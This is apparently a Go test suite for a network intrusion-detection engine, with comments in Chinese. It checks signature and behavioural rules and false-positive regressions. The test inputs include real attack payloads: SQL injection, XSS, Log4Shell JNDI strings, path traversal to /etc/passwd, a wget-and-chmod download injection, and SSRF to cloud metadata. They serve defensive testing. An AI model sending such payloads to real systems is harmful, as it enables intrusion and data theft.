package detect

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/model"
)

func TestNormalize(t *testing.T) {
	cases := map[string]string{
		"/a?id=1%2520UNION%2520SELECT": "/a?id=1 union select", // 双重编码
		"/a?q=1+UNION/**/SELECT":       "/a?q=1 union select",  // + 与注释混淆
		"/a?x=%u003Cscript%u003E":      "/a?x=<script>",        // IIS %u 编码
		"/a?x=&lt;svg&gt;":             "/a?x=<svg>",           // HTML 实体
		"/a?x=/*!50000select*/":        "/a?x= select ",        // MySQL 版本注释
		"/x?a=%zz":                     "/x?a=%zz",             // 非法编码保留
	}
	for in, want := range cases {
		if got := Normalize(in); got != want {
			t.Errorf("Normalize(%q) = %q, want %q", in, got, want)
		}
	}
}

func web(method, uri string, status int, ua string) *model.Event {
	return &model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: method, URI: uri, Status: status, Bytes: 100, UA: ua, Time: time.Now()}
}

func hitIDs(hits []model.Hit) map[string]model.Hit {
	m := map[string]model.Hit{}
	for _, h := range hits {
		m[h.RuleID] = h
	}
	return m
}

func TestSignatures(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ev   *model.Event
		rule string
	}{
		{web("GET", "/p?id=1%27%20UNION%20ALL%20SELECT%20NULL,user()--%20-", 200, "x"), "sqli-union"},
		{web("GET", "/p?id=1'%20AND%20SLEEP(5)--%20", 200, "x"), "sqli-time"},
		{web("GET", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, "x"), "xss-script"},
		{web("GET", "/d?f=../../../../etc/passwd", 200, "x"), "lfi-sensitive"},
		{web("GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array", 200, "x"), "cve-thinkphp"},
		{web("GET", "/", 200, "${jndi:ldap://x/a}"), "log4shell"},
		{web("GET", "/?x=${${lower:j}ndi:ldap://x/a}", 200, "x"), "log4shell"},
		{web("GET", "/shell?cd+/tmp;wget+http://198.51.100.7/m;chmod+777+m", 404, "x"), "cmd-download"},
		{web("GET", "/ping?h=127.0.0.1;cat%20/etc/passwd", 200, "x"), "cmd-inject"},
		{web("GET", "/.git/config", 200, "x"), "sens-vcs"},
		{web("GET", "/.env", 404, "x"), "sens-secret"},
		{web("GET", "/wwwroot.rar", 404, "x"), "sens-backup"},
		{web("POST", "/uploads/2026/10/a.php", 200, "x"), "webshell-upload"},
		{web("GET", "/", 200, "sqlmap/1.7"), "ua-scanner"},
		{web("GET", "/", 200, "Mozilla/5.0 (compatible; CensysInspect/1.1)"), "ua-mapping"},
		{web("PUT", "/x.jsp/", 201, "x"), "cve-put-upload"},
		{web("GET", "/cgi-bin/.%2e/.%2e/bin/sh", 400, "x"), "cve-apache-trav"},
		{web("GET", "/api?url=http://169.254.169.254/latest/meta-data/", 200, "x"), "ssrf-metadata"},
	}
	for _, c := range cases {
		if _, ok := hitIDs(e.Inspect(c.ev))[c.rule]; !ok {
			t.Errorf("%s 未命中 %s", c.ev.URI, c.rule)
		}
	}
	// 正常请求不应产生攻击命中
	for _, uri := range []string{"/", "/products/1024?ref=home&id=2", "/api/v1/orders?page=2&size=20", "/search?q=how+to+select+a+router", "/static/js/app.min.js"} {
		for _, h := range e.Inspect(web("GET", uri, 200, "Mozilla/5.0 (Windows NT 10.0) Chrome/129.0")) {
			if !h.TagOnly {
				t.Errorf("误报: %s 命中 %s", uri, h.RuleID)
			}
		}
	}
}

func TestResultJudgement(t *testing.T) {
	e, _ := NewEngine("", 1)
	h := hitIDs(e.Inspect(web("GET", "/.git/config", 200, "x")))["sens-vcs"]
	if h.Result != model.ResultSuccess || h.Severity != model.SevHigh {
		t.Fatalf("敏感文件 200 应研判为疑似成功并升级: %+v", h)
	}
	h = hitIDs(e.Inspect(web("GET", "/s?q=<script>", 403, "x")))["xss-script"]
	if h.Result != model.ResultBlocked {
		t.Fatalf("403 应为已拦截: %+v", h)
	}
	h = hitIDs(e.Inspect(web("GET", "/s?q=<script>", 200, "x")))["xss-script"]
	if h.Result != model.ResultPassed {
		t.Fatalf("XSS 200 无法判断成功，应为未拦截: %+v", h)
	}
	// 管理后台探测只在失败时命中，正常访问自家后台不告警
	if _, ok := hitIDs(e.Inspect(web("GET", "/wp-admin/", 200, "x")))["admin-probe"]; ok {
		t.Fatal("admin-probe 不应在 200 时命中")
	}
}

func TestBehavior(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	fired := map[string]bool{}
	for i := 0; i < 50; i++ {
		ev := &model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.2", DstIP: "10.0.0.1", DstPort: 1000 + i, Action: model.ActionDeny, Time: now.Add(time.Duration(i) * time.Second)}
		for _, h := range b.Observe(ev) {
			fired[h.RuleID] = true
		}
	}
	for i := 0; i < 40; i++ {
		ev := &model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.3", DstIP: "10.0.0.1", DstPort: 22, Time: now.Add(time.Duration(i) * time.Second)}
		for _, h := range b.Observe(ev) {
			fired[h.RuleID] = true
		}
	}
	for i := 0; i < 20; i++ {
		st := 401
		if i == 19 {
			st = 200
		}
		ev := &model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.4", Method: "POST", URI: "/wp-login.php", Status: st, Time: now.Add(time.Duration(i) * time.Second)}
		for _, h := range b.Observe(ev) {
			fired[h.RuleID] = true
		}
	}
	for _, id := range []string{"bhv-portscan", "bhv-fwbrute", "bhv-webbrute", "bhv-webbrute-ok"} {
		if !fired[id] {
			t.Errorf("行为检测 %s 未触发", id)
		}
	}
}

// 本轮修复的误报场景回归测试。
func TestFalsePositiveFixes(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ev   *model.Event
		rule string
	}{
		{web("GET", "/downloads/report-2024.zip", 200, "Mozilla/5.0"), "sens-backup"},      // 带日期的正常下载
		{web("GET", "/images/thumb.php?src=a.jpg", 200, "Mozilla/5.0"), "webshell-static"}, // 缩略图脚本
		{web("GET", "/", 200, "python-httpx/0.27.0"), "ua-scanner"},                        // httpx 库不是扫描器
		{web("POST", "/run", 200, "Mozilla/5.0"), "cve-container"},                         // 普通业务接口
		{web("GET", "/blog/script", 200, "Mozilla/5.0"), "cve-middleware"},
		{web("GET", "/?returnpage=https://sso.example.com/", 200, "Mozilla/5.0"), "rfi"},
	}
	for _, c := range cases {
		if h, ok := hitIDs(e.Inspect(c.ev))[c.rule]; ok {
			t.Errorf("%s %s 误报 %s: %s", c.ev.Method, c.ev.URI, c.rule, h.Evidence)
		}
	}
	// 真实攻击仍需命中
	for _, c := range []struct {
		ev   *model.Event
		rule string
	}{
		{web("GET", "/wwwroot.zip", 200, "x"), "sens-backup"},
		{web("GET", "/db.sql", 404, "x"), "sens-backup"},
		{web("POST", "/images/x.php", 200, "x"), "webshell-static"},
		{web("GET", "/jenkins/script", 200, "x"), "cve-middleware"},
	} {
		if _, ok := hitIDs(e.Inspect(c.ev))[c.rule]; !ok {
			t.Errorf("%s %s 未命中 %s", c.ev.Method, c.ev.URI, c.rule)
		}
	}
	// 内网放行的东西向流量不告警，外网放行告警
	internal := &model.Event{Kind: model.KindFirewall, SrcIP: "10.1.2.3", DstIP: "10.0.0.5", DstPort: 3306, Action: model.ActionAllow}
	if hits := e.Inspect(internal); len(hits) != 0 {
		t.Errorf("内网放行的数据库访问不应告警: %+v", hits)
	}
	external := &model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.3", DstIP: "10.0.0.5", DstPort: 3306, Action: model.ActionAllow}
	if hits := e.Inspect(external); len(hits) != 1 || hits[0].Result != model.ResultAllowed {
		t.Errorf("外网放行的数据库访问应告警: %+v", hits)
	}
}

// 失败登录同样返回 302（如 Spring Security 跳回 /login?error）时不应误判为破解成功。
func TestBruteSuccessHeuristic(t *testing.T) {
	b := NewBehavior(config.Default().Detect.Thresholds)
	now := time.Now()
	for i := 0; i < 30; i++ {
		for _, h := range b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.9", Method: "POST", URI: "/login", Status: 302, Time: now}) {
			if h.RuleID == "bhv-webbrute-ok" {
				t.Fatal("失败也返回 302 时不应判定为破解成功")
			}
		}
	}
	// 表单回显错误（200）之后出现 302 跳转则判定疑似成功
	got := false
	for i := 0; i < 20; i++ {
		st := 200
		if i == 19 {
			st = 302
		}
		for _, h := range b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.10", Method: "POST", URI: "/login", Status: st, Time: now}) {
			got = got || h.RuleID == "bhv-webbrute-ok"
		}
	}
	if !got {
		t.Fatal("200 失败后出现 302 应判定为疑似成功")
	}
}

// 大规模端口扫描时每个 IP 的窗口状态必须有上限。
func TestBehaviorMemoryBounded(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	for port := 1; port <= 5000; port++ {
		b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.11", DstIP: "10.0.0.1", DstPort: port, Time: now})
	}
	w := b.fw["198.51.100.11"]
	if len(w.ports) > th.PortScanPorts*5 || len(w.sweep) > 64 {
		t.Fatalf("窗口状态未受限: ports=%d sweep=%d", len(w.ports), len(w.sweep))
	}
}

// 未来时间的异常日志不能成为窗口过期的基准，否则清理逻辑会失效、窗口无限增长。
func TestBehaviorIgnoresFutureTime(t *testing.T) {
	b := NewBehavior(config.Default().Detect.Thresholds)
	now := time.Now()
	b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Status: 404, URI: "/a", Time: now.AddDate(50, 0, 0)})
	b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.2", Status: 404, URI: "/a", Time: now})
	if b.latest.After(now.Add(time.Hour)) {
		t.Fatalf("latest 被未来时间污染: %v", b.latest)
	}
	b.prune(b.latest)
	if _, ok := b.web["198.51.100.1"]; ok {
		t.Fatal("未来时间的窗口应被清理")
	}
	if _, ok := b.web["198.51.100.2"]; !ok {
		t.Fatal("正常窗口不应被清理")
	}
}

// 内网主机访问公网的出站流量（设备日志未标注方向）不判为扫描、洪泛或暴力破解；内网之间的横向扫描仍检测。
func TestBehaviorIgnoresEgress(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	for i := 0; i < 2000; i++ {
		ev := &model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.45", DstIP: fmt.Sprintf("93.184.%d.%d", i/250, i%250+1),
			DstPort: []int{443, 80, 22, 3389, 8443}[i%5] + i%40, Action: model.ActionAllow, Time: now}
		if hits := b.Observe(ev); len(hits) > 0 {
			t.Fatalf("正常上网的出站流量不应告警: %+v", hits)
		}
	}
	var lateral []model.Hit
	for i := 0; i < th.HostSweep+5; i++ {
		lateral = append(lateral, b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.45", DstIP: fmt.Sprintf("10.0.1.%d", i+1),
			DstPort: 445, Action: model.ActionDeny, Time: now})...)
	}
	if len(lateral) == 0 || lateral[0].Category != CatHostSweep {
		t.Fatalf("内网横向扫描应告警: %+v", lateral)
	}
	if !IsEgress(&model.Event{Kind: model.KindFirewall, SrcIP: "192.168.1.5", DstIP: "1.1.1.1"}) ||
		IsEgress(&model.Event{Kind: model.KindFirewall, SrcIP: "1.1.1.1", DstIP: "192.168.1.5"}) ||
		IsEgress(&model.Event{Kind: model.KindWeb, SrcIP: "192.168.1.5"}) {
		t.Fatal("出站判断错误")
	}
}

// 盲打 / 带外利用类攻击（Log4j、SSRF、XXE、反序列化）返回 200 无法说明成功，研判为未拦截。
func TestBlindAttackNotSuccess(t *testing.T) {
	e, _ := NewEngine("", 1)
	for _, uri := range []string{"/?x=${jndi:ldap://198.51.100.9:1389/a}", "/fetch?url=gopher://127.0.0.1:6379/_INFO", "/img?src=http://169.254.169.254/latest/meta-data/"} {
		for _, h := range e.Inspect(web("GET", uri, 200, "x")) {
			if !h.TagOnly && h.Result == model.ResultSuccess {
				t.Errorf("%s 命中 %s 不应研判为疑似成功", uri, h.RuleID)
			}
		}
	}
}

// 分布式暴力破解（撞库）：每个来源只失败几次，按来源统计不触发，但同一登录接口的失败总数与来源数达到阈值后告警。
func TestDistributedBrute(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	var hits []model.Hit
	for i := 0; i < 40; i++ {
		for j := 0; j < 4; j++ {
			ev := &model.Event{Kind: model.KindWeb, SrcIP: fmt.Sprintf("198.51.100.%d", i+1), Method: "POST", URI: "/login", Status: 401,
				Time: now.Add(time.Duration(i*4+j) * time.Second)}
			hits = append(hits, b.Observe(ev)...)
		}
	}
	var dist int
	for _, h := range hits {
		if h.RuleID == "bhv-webbrute" {
			t.Fatal("单个来源只失败 4 次，不应触发单源暴力破解")
		}
		if h.RuleID == "bhv-distbrute" {
			dist++
		}
	}
	// 失败 100 次后（第 25 个来源）开始告警，之后参与的来源各告警一次
	if dist < 10 || dist > 20 {
		t.Fatalf("分布式暴力破解告警 %d 次", dist)
	}
	// 正常登录（200）不计入失败
	b2 := NewBehavior(th)
	for i := 0; i < 300; i++ {
		if hs := b2.Observe(&model.Event{Kind: model.KindWeb, SrcIP: fmt.Sprintf("203.0.113.%d", i%200+1), Method: "POST", URI: "/login", Status: 302, Time: now}); len(hs) > 0 {
			t.Fatalf("正常登录不应告警: %+v", hs)
		}
	}
}

// 接口遍历 / 批量爬取：同一来源按 ID 请求大量不同对象并成功返回；搜索引擎爬虫与失败的请求不计入。
func TestEnumeration(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	now := time.Now()
	var hits []model.Hit
	for i := 0; i < th.EnumIDs+20; i++ {
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.7", Method: "GET",
			URI: fmt.Sprintf("/api/v1/user/%d/profile", 10000+i), Status: 200, Time: now.Add(time.Duration(i) * time.Second)})...)
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "66.249.66.1", Method: "GET", UA: "Mozilla/5.0 (compatible; Googlebot/2.1)",
			URI: fmt.Sprintf("/products/%d", i), Status: 200, Time: now.Add(time.Duration(i) * time.Second)})...)
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.8", Method: "GET",
			URI: fmt.Sprintf("/order?id=%d", i), Status: 404, Time: now.Add(time.Duration(i) * time.Second)})...)
	}
	var enum []model.Hit
	for _, h := range hits {
		if h.RuleID == "bhv-enum" {
			enum = append(enum, h)
		}
	}
	if len(enum) != 1 || enum[0].Severity != model.SevHigh || enum[0].Phase != model.PhaseCollection || !strings.Contains(enum[0].Evidence, "/api/v1/user/{id}/profile") {
		t.Fatalf("接口遍历: %+v", enum)
	}
	if k, id := enumKey("/order/detail?no=20261025001&x=a"); k != "/order/detail?no={id}" || id != "20261025001" {
		t.Fatalf("查询参数中的 ID: %s %s", k, id)
	}
}

// 周期性外连：内网主机按约 7 分钟的固定间隔连接同一外部地址时告警；间隔随机或连接 DNS 不告警。
func TestBeacon(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	base := time.Now().Add(-2 * time.Hour)
	var hits []model.Hit
	for i := 0; i < th.BeaconConns+2; i++ {
		jitter := time.Duration((i*37)%30) * time.Second
		at := base.Add(time.Duration(i)*7*time.Minute + jitter)
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.31", DstIP: "198.51.100.66", DstPort: 443, Action: model.ActionAllow, Time: at})...)
		// 同一会话中的多条连接日志不影响间隔判断
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.31", DstIP: "198.51.100.66", DstPort: 443, Action: model.ActionAllow, Time: at.Add(time.Second)})...)
		// 随机间隔的正常访问
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.45", DstIP: "93.184.216.34", DstPort: 443, Action: model.ActionAllow,
			Time: base.Add(time.Duration(i*i*97) * time.Second)})...)
		hits = append(hits, b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.45", DstIP: "8.8.8.8", DstPort: 53, Action: model.ActionAllow, Time: at})...)
	}
	if len(hits) != 1 || hits[0].Category != CatBeacon || hits[0].Severity != model.SevMedium || !strings.Contains(hits[0].Evidence, "10.0.0.31") {
		t.Fatalf("周期性外连: %+v", hits)
	}
}

func TestEnumKeyParams(t *testing.T) {
	for uri, want := range map[string]string{
		"/order?id=1001": "/order?id={id}", "/u?user_id=7": "/u?user_id={id}", "/o?orderNo=2026": "/o?orderNo={id}", "/a?uid=5&x=1": "/a?uid={id}",
		"/search?q=12345": "", "/list?page=2": "", "/list?size=20&page=3": "", "/static/app.js": "",
	} {
		if k, _ := enumKey(uri); k != want {
			t.Errorf("%s: %q，期望 %q", uri, k, want)
		}
	}
}
